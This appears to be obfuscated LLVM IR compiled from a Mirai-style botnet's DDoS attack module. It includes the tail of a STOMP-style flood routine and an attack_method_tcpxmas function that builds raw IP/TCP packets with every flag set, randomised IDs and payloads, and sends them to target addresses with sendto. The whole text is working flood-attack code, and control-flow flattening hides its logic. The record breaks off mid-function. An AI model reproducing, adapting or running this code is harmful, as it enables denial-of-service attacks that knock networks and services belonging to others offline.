  %343 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %342, i32 0, i32 5
  store i8 %341, i8* %343, align 4
  %344 = load i8, i8* %16, align 1
  %345 = icmp ne i8 %344, 0
  %346 = select i1 %345, i32 -972472228, i32 -261601980
  store i32 %346, i32* %switchVar
  br label %loopEnd

; <label>:347:                                    ; preds = %loopEntry
  %348 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %349 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %350 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %349, i32 0, i32 4
  store i16 %348, i16* %350, align 2
  store i32 -261601980, i32* %switchVar
  br label %loopEnd

; <label>:351:                                    ; preds = %loopEntry
  %352 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %353 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %352, i32 0, i32 6
  store i8 6, i8* %353, align 1
  %354 = load i32, i32* @LOCAL_ADDR, align 4
  %355 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %356 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %355, i32 0, i32 8
  store i32 %354, i32* %356, align 4
  %357 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %358 = load i32, i32* %9, align 4
  %359 = sext i32 %358 to i64
  %360 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %357, i64 %359
  %361 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %360, i32 0, i32 0
  %362 = load i32, i32* %361, align 4
  %363 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %364 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %363, i32 0, i32 9
  store i32 %362, i32* %364, align 4
  %365 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %366 = load i32, i32* %9, align 4
  %367 = sext i32 %366 to i64
  %368 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %365, i64 %367
  %369 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %368, i32 0, i32 3
  %370 = load i16, i16* %369, align 4
  %371 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %372 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %371, i32 0, i32 0
  store i16 %370, i16* %372, align 4
  %373 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %374 = load i32, i32* %9, align 4
  %375 = sext i32 %374 to i64
  %376 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %373, i64 %375
  %377 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %376, i32 0, i32 4
  %378 = load i16, i16* %377, align 2
  %379 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %380 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %379, i32 0, i32 1
  store i16 %378, i16* %380, align 2
  %381 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %382 = load i32, i32* %9, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %381, i64 %383
  %385 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %384, i32 0, i32 2
  %386 = load i32, i32* %385, align 4
  %387 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %388 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %387, i32 0, i32 2
  store i32 %386, i32* %388, align 4
  %389 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %390 = load i32, i32* %9, align 4
  %391 = sext i32 %390 to i64
  %392 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %389, i64 %391
  %393 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %392, i32 0, i32 1
  %394 = load i32, i32* %393, align 4
  %395 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %396 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %395, i32 0, i32 3
  store i32 %394, i32* %396, align 4
  %397 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %398 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %397, i32 0, i32 4
  %399 = load i16, i16* %398, align 4
  %400 = and i16 %399, -241
  %401 = or i16 %400, 128
  store i16 %401, i16* %398, align 4
  %402 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %403 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %402, i32 0, i32 4
  %404 = load i16, i16* %403, align 4
  %405 = and i16 %404, -257
  %406 = or i16 %405, 256
  store i16 %406, i16* %403, align 4
  %407 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %408 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %407, i32 0, i32 4
  %409 = load i16, i16* %408, align 4
  %410 = and i16 %409, -4097
  %411 = or i16 %410, 4096
  store i16 %411, i16* %408, align 4
  %412 = call i32 @rand_next()
  %413 = and i32 %412, 65535
  %414 = trunc i32 %413 to i16
  %415 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %416 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %415, i32 0, i32 5
  store i16 %414, i16* %416, align 2
  %417 = load i8, i8* %18, align 1
  %418 = sext i8 %417 to i16
  %419 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %420 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %419, i32 0, i32 4
  %421 = load i16, i16* %420, align 4
  %422 = and i16 %418, 1
  %423 = shl i16 %422, 13
  %424 = and i16 %421, -8193
  %425 = or i16 %424, %423
  store i16 %425, i16* %420, align 4
  %426 = load i8, i8* %19, align 1
  %427 = sext i8 %426 to i16
  %428 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %429 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %428, i32 0, i32 4
  %430 = load i16, i16* %429, align 4
  %431 = and i16 %427, 1
  %432 = shl i16 %431, 12
  %433 = and i16 %430, -4097
  %434 = or i16 %433, %432
  store i16 %434, i16* %429, align 4
  %435 = load i8, i8* %20, align 1
  %436 = sext i8 %435 to i16
  %437 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %438 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %437, i32 0, i32 4
  %439 = load i16, i16* %438, align 4
  %440 = and i16 %436, 1
  %441 = shl i16 %440, 11
  %442 = and i16 %439, -2049
  %443 = or i16 %442, %441
  store i16 %443, i16* %438, align 4
  %444 = load i8, i8* %21, align 1
  %445 = sext i8 %444 to i16
  %446 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %447 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %446, i32 0, i32 4
  %448 = load i16, i16* %447, align 4
  %449 = and i16 %445, 1
  %450 = shl i16 %449, 10
  %451 = and i16 %448, -1025
  %452 = or i16 %451, %450
  store i16 %452, i16* %447, align 4
  %453 = load i8, i8* %22, align 1
  %454 = sext i8 %453 to i16
  %455 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %456 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %455, i32 0, i32 4
  %457 = load i16, i16* %456, align 4
  %458 = and i16 %454, 1
  %459 = shl i16 %458, 9
  %460 = and i16 %457, -513
  %461 = or i16 %460, %459
  store i16 %461, i16* %456, align 4
  %462 = load i8, i8* %23, align 1
  %463 = sext i8 %462 to i16
  %464 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %465 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %464, i32 0, i32 4
  %466 = load i16, i16* %465, align 4
  %467 = and i16 %463, 1
  %468 = shl i16 %467, 8
  %469 = and i16 %466, -257
  %470 = or i16 %469, %468
  store i16 %470, i16* %465, align 4
  %471 = load i8*, i8** %38, align 8
  %472 = load i32, i32* %24, align 4
  call void @rand_str(i8* %471, i32 %472)
  store i32 -431011026, i32* %switchVar
  br label %loopEnd

; <label>:473:                                    ; preds = %loopEntry
  %474 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %475 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %474, i32 0, i32 4
  %476 = load i16, i16* %475, align 4
  %477 = lshr i16 %476, 8
  %478 = and i16 %477, 1
  %479 = zext i16 %478 to i32
  %480 = icmp ne i32 %479, 0
  %481 = select i1 %480, i32 -1309983456, i32 -948060510
  store i32 %481, i32* %switchVar
  br label %loopEnd

; <label>:482:                                    ; preds = %loopEntry
  %483 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %484 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %483, i32 0, i32 4
  %485 = load i16, i16* %484, align 4
  %486 = lshr i16 %485, 10
  %487 = and i16 %486, 1
  %488 = zext i16 %487 to i32
  %489 = icmp ne i32 %488, 0
  %490 = select i1 %489, i32 -1309983456, i32 -1256840644
  store i32 %490, i32* %switchVar
  br label %loopEnd

; <label>:491:                                    ; preds = %loopEntry
  %492 = load i32, i32* %26, align 4
  %493 = call i32 @close(i32 %492)
  store i32 2137523763, i32* %switchVar
  br label %loopEnd

; <label>:494:                                    ; preds = %loopEntry
  store i32 -564985080, i32* %switchVar
  br label %loopEnd

; <label>:495:                                    ; preds = %loopEntry
  store i32 -1604423163, i32* %switchVar
  br label %loopEnd

; <label>:496:                                    ; preds = %loopEntry
  store i32 -1710798392, i32* %switchVar
  br label %loopEnd

; <label>:497:                                    ; preds = %loopEntry
  %498 = call i64 @time(i64* null) #6
  %499 = load i64, i64* %31, align 8
  %500 = sub nsw i64 %498, %499
  %501 = icmp sgt i64 %500, 10
  %502 = select i1 %501, i32 -1300222963, i32 -72949968
  store i32 %502, i32* %switchVar
  br label %loopEnd

; <label>:503:                                    ; preds = %loopEntry
  %504 = load i32, i32* %26, align 4
  %505 = call i32 @close(i32 %504)
  store i32 2137523763, i32* %switchVar
  br label %loopEnd

; <label>:506:                                    ; preds = %loopEntry
  store i32 1155307588, i32* %switchVar
  br label %loopEnd

; <label>:507:                                    ; preds = %loopEntry
  store i32 712238639, i32* %switchVar
  br label %loopEnd

; <label>:508:                                    ; preds = %loopEntry
  %509 = load i32, i32* %9, align 4
  %510 = add nsw i32 %509, 1
  store i32 %510, i32* %9, align 4
  store i32 -1246967717, i32* %switchVar
  br label %loopEnd

; <label>:511:                                    ; preds = %loopEntry
  store i32 -1195686463, i32* %switchVar
  br label %loopEnd

; <label>:512:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 562727587, i32* %switchVar
  br label %loopEnd

; <label>:513:                                    ; preds = %loopEntry
  %514 = load i32, i32* %9, align 4
  %515 = load i8, i8* %5, align 1
  %516 = zext i8 %515 to i32
  %517 = icmp slt i32 %514, %516
  %518 = select i1 %517, i32 -1756905999, i32 1738933828
  store i32 %518, i32* %switchVar
  br label %loopEnd

; <label>:519:                                    ; preds = %loopEntry
  %520 = load i8**, i8*** %12, align 8
  %521 = load i32, i32* %9, align 4
  %522 = sext i32 %521 to i64
  %523 = getelementptr inbounds i8*, i8** %520, i64 %522
  %524 = load i8*, i8** %523, align 8
  store i8* %524, i8** %39, align 8
  %525 = load i8*, i8** %39, align 8
  %526 = bitcast i8* %525 to %struct.iphdr*
  store %struct.iphdr* %526, %struct.iphdr** %40, align 8
  %527 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %528 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %527, i64 1
  %529 = bitcast %struct.iphdr* %528 to %struct.tcphdr*
  store %struct.tcphdr* %529, %struct.tcphdr** %41, align 8
  %530 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %531 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %530, i64 1
  %532 = bitcast %struct.tcphdr* %531 to i8*
  store i8* %532, i8** %42, align 8
  %533 = load i16, i16* %14, align 2
  %534 = zext i16 %533 to i32
  %535 = icmp eq i32 %534, 65535
  %536 = select i1 %535, i32 1229991099, i32 -1854089570
  store i32 %536, i32* %switchVar
  br label %loopEnd

; <label>:537:                                    ; preds = %loopEntry
  %538 = call i32 @rand_next()
  %539 = and i32 %538, 65535
  %540 = trunc i32 %539 to i16
  %541 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %542 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %541, i32 0, i32 3
  store i16 %540, i16* %542, align 4
  store i32 -1854089570, i32* %switchVar
  br label %loopEnd

; <label>:543:                                    ; preds = %loopEntry
  %544 = load i8, i8* %25, align 1
  %545 = icmp ne i8 %544, 0
  %546 = select i1 %545, i32 -434764079, i32 1732950702
  store i32 %546, i32* %switchVar
  br label %loopEnd

; <label>:547:                                    ; preds = %loopEntry
  %548 = load i8*, i8** %42, align 8
  %549 = load i32, i32* %24, align 4
  call void @rand_str(i8* %548, i32 %549)
  store i32 1732950702, i32* %switchVar
  br label %loopEnd

; <label>:550:                                    ; preds = %loopEntry
  %551 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %552 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %551, i32 0, i32 7
  store i16 0, i16* %552, align 2
  %553 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %554 = bitcast %struct.iphdr* %553 to i16*
  %555 = call zeroext i16 @checksum_generic(i16* %554, i32 20)
  %556 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %557 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %556, i32 0, i32 7
  store i16 %555, i16* %557, align 2
  %558 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %559 = load i32, i32* %9, align 4
  %560 = sext i32 %559 to i64
  %561 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %558, i64 %560
  %562 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %561, i32 0, i32 1
  %563 = load i32, i32* %562, align 4
  %564 = add i32 %563, 1
  store i32 %564, i32* %562, align 4
  %565 = trunc i32 %563 to i16
  %566 = call zeroext i16 @htons(i16 zeroext %565) #7
  %567 = zext i16 %566 to i32
  %568 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %569 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %568, i32 0, i32 2
  store i32 %567, i32* %569, align 4
  %570 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %571 = load i32, i32* %9, align 4
  %572 = sext i32 %571 to i64
  %573 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %570, i64 %572
  %574 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %573, i32 0, i32 2
  %575 = load i32, i32* %574, align 4
  %576 = trunc i32 %575 to i16
  %577 = call zeroext i16 @htons(i16 zeroext %576) #7
  %578 = zext i16 %577 to i32
  %579 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %580 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %579, i32 0, i32 3
  store i32 %578, i32* %580, align 4
  %581 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %582 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %581, i32 0, i32 6
  store i16 0, i16* %582, align 4
  %583 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %584 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %585 = bitcast %struct.tcphdr* %584 to i8*
  %586 = load i32, i32* %24, align 4
  %587 = sext i32 %586 to i64
  %588 = add i64 20, %587
  %589 = trunc i64 %588 to i16
  %590 = call zeroext i16 @htons(i16 zeroext %589) #7
  %591 = load i32, i32* %24, align 4
  %592 = sext i32 %591 to i64
  %593 = add i64 20, %592
  %594 = trunc i64 %593 to i32
  %595 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %583, i8* %585, i16 zeroext %590, i32 %594)
  %596 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %597 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %596, i32 0, i32 6
  store i16 %595, i16* %597, align 4
  %598 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %599 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %598, i32 0, i32 1
  %600 = load i16, i16* %599, align 2
  %601 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %602 = load i32, i32* %9, align 4
  %603 = sext i32 %602 to i64
  %604 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %601, i64 %603
  %605 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %604, i32 0, i32 0
  %606 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %605, i32 0, i32 1
  store i16 %600, i16* %606, align 2
  %607 = load i32, i32* %10, align 4
  %608 = load i8*, i8** %39, align 8
  %609 = load i32, i32* %24, align 4
  %610 = sext i32 %609 to i64
  %611 = add i64 40, %610
  %612 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %613 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %614 = load i32, i32* %9, align 4
  %615 = sext i32 %614 to i64
  %616 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %613, i64 %615
  %617 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %616, i32 0, i32 0
  %618 = bitcast %struct.sockaddr_in* %617 to %struct.sockaddr*
  store %struct.sockaddr* %618, %struct.sockaddr** %612, align 8
  %619 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %620 = load %struct.sockaddr*, %struct.sockaddr** %619, align 8
  %621 = call i64 @sendto(i32 %607, i8* %608, i64 %611, i32 16384, %struct.sockaddr* %620, i32 16)
  store i32 -380119843, i32* %switchVar
  br label %loopEnd

; <label>:622:                                    ; preds = %loopEntry
  %623 = load i32, i32* %9, align 4
  %624 = add nsw i32 %623, 1
  store i32 %624, i32* %9, align 4
  store i32 562727587, i32* %switchVar
  br label %loopEnd

; <label>:625:                                    ; preds = %loopEntry
  store i32 -1195686463, i32* %switchVar
  br label %loopEnd

; <label>:626:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %625, %622, %550, %547, %543, %537, %519, %513, %512, %511, %508, %507, %506, %503, %497, %496, %495, %494, %491, %482, %473, %351, %347, %255, %246, %237, %224, %219, %210, %209, %197, %189, %185, %180, %175, %166, %145, %129, %128, %124, %123, %117, %116, %113, %107, %106, %first, %switchDefault
  br label %loopEntry
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #1

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #3

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpxmas(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.attack_stomp_data*, align 8
  %12 = alloca i8**, align 8
  %13 = alloca i8, align 1
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i8, align 1
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.sockaddr_in, align 4
  %28 = alloca %struct.sockaddr_in, align 4
  %29 = alloca i32, align 4
  %30 = alloca [256 x i8], align 16
  %31 = alloca i64, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %33 = alloca i32, align 4
  %34 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %struct.iphdr*, align 8
  %41 = alloca %struct.tcphdr*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %44 = load i8, i8* %5, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 16) #6
  %47 = bitcast i8* %46 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %47, %struct.attack_stomp_data** %11, align 8
  %48 = load i8, i8* %5, align 1
  %49 = zext i8 %48 to i64
  %50 = call noalias i8* @calloc(i64 %49, i64 8) #6
  %51 = bitcast i8* %50 to i8**
  store i8** %51, i8*** %12, align 8
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 2, i32 0)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %13, align 1
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 3, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %14, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 4, i32 64)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %15, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 5, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %16, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %17, align 2
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 11, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %18, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 12, i32 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %19, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 13, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %20, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 14, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %21, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 15, i32 1)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %22, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = call i32 @attack_get_opt_int(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 16, i32 1)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %23, align 1
  %96 = load i8, i8* %7, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %98 = call i32 @attack_get_opt_int(i8 zeroext %96, %struct.attack_option* %97, i8 zeroext 0, i32 768)
  store i32 %98, i32* %24, align 4
  %99 = load i8, i8* %7, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 1, i32 1)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %25, align 1
  %103 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %103, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 -599899167, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -599899167, label %first
    i32 1046970722, label %106
    i32 -2032083607, label %107
    i32 1130274944, label %113
    i32 -156528280, label %116
    i32 -1434516422, label %117
    i32 -1801312861, label %123
    i32 -1310983294, label %124
    i32 -375118814, label %128
    i32 -820452590, label %129
    i32 -586356290, label %145
    i32 4537360, label %166
    i32 985113982, label %175
    i32 -517029735, label %180
    i32 1162310886, label %185
    i32 -605655632, label %189
    i32 98050240, label %197
    i32 -973078971, label %209
    i32 -2140187308, label %210
    i32 -590856150, label %219
    i32 1424193968, label %224
    i32 -559410922, label %237
    i32 2009869744, label %246
    i32 -1946230961, label %255
    i32 -1291775632, label %347
    i32 650023560, label %351
    i32 -2051751231, label %473
    i32 497890448, label %482
    i32 -1195492709, label %491
    i32 1869769376, label %494
    i32 1594842740, label %495
    i32 -1815634802, label %496
    i32 -915986237, label %497
    i32 -2020661070, label %503
    i32 -573224182, label %506
    i32 989973610, label %507
    i32 1977427059, label %508
    i32 -610762006, label %511
    i32 73241473, label %512
    i32 -1573652483, label %513
    i32 1526958672, label %519
    i32 1450319552, label %537
    i32 -1287090787, label %543
    i32 1933945050, label %547
    i32 -963423579, label %550
    i32 1460685780, label %622
    i32 1100891894, label %625
    i32 1014103075, label %626
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %104 = icmp eq i32 %.reload, -1
  %105 = select i1 %104, i32 1046970722, i32 -2032083607
  store i32 %105, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  store i32 1014103075, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %108 = load i32, i32* %10, align 4
  %109 = bitcast i32* %9 to i8*
  %110 = call i32 @setsockopt(i32 %108, i32 0, i32 3, i8* %109, i32 4) #6
  %111 = icmp eq i32 %110, -1
  %112 = select i1 %111, i32 1130274944, i32 -156528280
  store i32 %112, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  %114 = load i32, i32* %10, align 4
  %115 = call i32 @close(i32 %114)
  store i32 1014103075, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1434516422, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i32, i32* %9, align 4
  %119 = load i8, i8* %5, align 1
  %120 = zext i8 %119 to i32
  %121 = icmp slt i32 %118, %120
  %122 = select i1 %121, i32 -1801312861, i32 -610762006
  store i32 %122, i32* %switchVar
  br label %loopEnd

; <label>:123:                                    ; preds = %loopEntry
  store i32 -1310983294, i32* %switchVar
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %125, i32* %26, align 4
  %126 = icmp eq i32 %125, -1
  %127 = select i1 %126, i32 -375118814, i32 -820452590
  store i32 %127, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  store i32 1977427059, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  %130 = load i32, i32* %26, align 4
  %131 = load i32, i32* %26, align 4
  %132 = call i32 (i32, i32, ...) @fcntl(i32 %131, i32 3, i32 0)
  %133 = or i32 %132, 2048
  %134 = call i32 (i32, i32, ...) @fcntl(i32 %130, i32 4, i32 %133)
  %135 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i16 2, i16* %135, align 4
  %136 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %137 = load i32, i32* %9, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %136, i64 %138
  %140 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %139, i32 0, i32 2
  %141 = load i8, i8* %140, align 4
  %142 = zext i8 %141 to i32
  %143 = icmp slt i32 %142, 32
  %144 = select i1 %143, i32 -586356290, i32 4537360
  store i32 %144, i32* %switchVar
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  %146 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %147 = load i32, i32* %9, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %146, i64 %148
  %150 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %149, i32 0, i32 1
  %151 = load i32, i32* %150, align 4
  %152 = call i32 @ntohl(i32 %151) #7
  %153 = call i32 @rand_next()
